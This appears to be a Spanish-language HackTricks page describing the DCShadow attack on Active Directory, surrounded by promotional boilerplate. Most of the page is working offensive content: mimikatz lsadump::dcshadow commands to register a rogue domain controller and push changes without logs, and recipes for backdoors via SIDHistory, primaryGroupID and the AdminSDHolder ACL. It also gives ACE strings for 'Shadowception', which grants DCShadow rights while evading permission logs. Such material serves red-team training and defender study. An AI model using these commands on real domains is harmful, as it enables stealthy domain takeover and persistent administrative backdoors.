<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>


# DCShadow

Registra un **nuevo Controlador de Dominio** en el AD y lo utiliza para **empujar atributos** (SIDHistory, SPNs...) en objetos especificados **sin** dejar ningún **registro** sobre las **modificaciones**. Necesitas privilegios de **DA** y estar dentro del **dominio raíz**.\
Ten en cuenta que si utilizas datos incorrectos, aparecerán registros bastante feos.

Para realizar el ataque necesitas 2 instancias de mimikatz. Una de ellas iniciará los servidores RPC con privilegios de SYSTEM (debes indicar aquí los cambios que deseas realizar), y la otra instancia se utilizará para empujar los valores:

{% code title="mimikatz1 (servidores RPC)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - Necesita DA o similar" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Ten en cuenta que **`elevate::token`** no funcionará en la sesión de `mimikatz1` ya que eleva los privilegios del hilo, pero necesitamos elevar el **privilegio del proceso**.\
También puedes seleccionar un objeto "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Puedes realizar los cambios desde un DA o desde un usuario con estos permisos mínimos:

* En el **objeto de dominio**:
* _DS-Install-Replica_ (Agregar/Quitar réplica en el dominio)
* _DS-Replication-Manage-Topology_ (Administrar topología de replicación)
* _DS-Replication-Synchronize_ (Sincronización de replicación)
* El objeto de **Sitios** (y sus hijos) en el **contenedor de Configuración**:
* _CreateChild y DeleteChild_
* El objeto del **equipo registrado como un DC**:
* _WriteProperty_ (No Write)
* El **objeto de destino**:
* _WriteProperty_ (No Write)

Puedes usar [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) para otorgar estos privilegios a un usuario sin privilegios (ten en cuenta que esto dejará algunos registros). Esto es mucho más restrictivo que tener privilegios de DA.\
Por ejemplo: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Esto significa que el nombre de usuario _**student1**_ cuando inicie sesión en la máquina _**mcorp-student1**_ tiene permisos de DCShadow sobre el objeto _**root1user**_.

## Usando DCShadow para crear puertas traseras

{% code title="Establecer Enterprise Admins en SIDHistory a un usuario" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="Cambiar PrimaryGroupID (poner usuario como miembro de Administradores de Dominio)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="Modificar ntSecurityDescriptor de AdminSDHolder (dar Control Total a un usuario)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - Dar permisos a DCShadow usando DCShadow (sin registros de permisos modificados)

Necesitamos agregar los siguientes ACEs con el SID de nuestro usuario al final:

* En el objeto de dominio:
  * `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;SIDUsuario)`
  * `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;SIDUsuario)`
  * `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;SIDUsuario)`
* En el objeto de la computadora del atacante: `(A;;WP;;;SIDUsuario)`
* En el objeto de usuario objetivo: `(A;;WP;;;SIDUsuario)`
* En el objeto de Sitios en el contenedor de Configuración: `(A;CI;CCDC;;;SIDUsuario)`

Para obtener el ACE actual de un objeto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

Ten en cuenta que en este caso necesitas hacer **varios cambios,** no solo uno. Por lo tanto, en la sesión de **mimikatz1** (servidor RPC) usa el parámetro **`/stack` con cada cambio** que desees realizar. De esta manera, solo necesitarás hacer **`/push`** una vez para realizar todos los cambios acumulados en el servidor falso.



[**Más información sobre DCShadow en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
